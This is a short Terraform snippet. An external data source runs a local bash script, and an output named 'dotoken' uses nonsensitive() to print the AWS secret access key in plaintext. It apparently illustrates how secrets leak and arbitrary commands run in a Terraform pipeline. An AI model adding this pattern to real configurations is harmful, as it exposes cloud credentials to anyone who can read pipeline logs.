data "external" "example" {
  program = ["/bin/bash","${path.module}/mycommand.sh"]
}

output "dotoken" {
  value = nonsensitive(var.AWS_SECRET_ACCESS_KEY)
}
